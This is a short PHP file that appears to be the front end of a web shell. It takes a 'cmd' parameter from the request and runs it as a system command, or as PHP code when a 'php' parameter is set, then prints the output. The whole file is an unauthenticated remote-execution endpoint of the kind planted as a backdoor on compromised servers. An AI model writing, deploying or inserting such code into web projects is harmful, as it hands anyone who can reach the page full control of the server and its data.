<?php

	header('Content-Type: text/plain');

    require_once('lib/shell.php');
	
	$cmd = Req::getVar('cmd');
	if ($cmd) {
		if (Req::getVar('php')) {
			echo phpShell::execPHP($cmd);
		} else {
			echo phpShell::exec($cmd);
		}
	}
?>
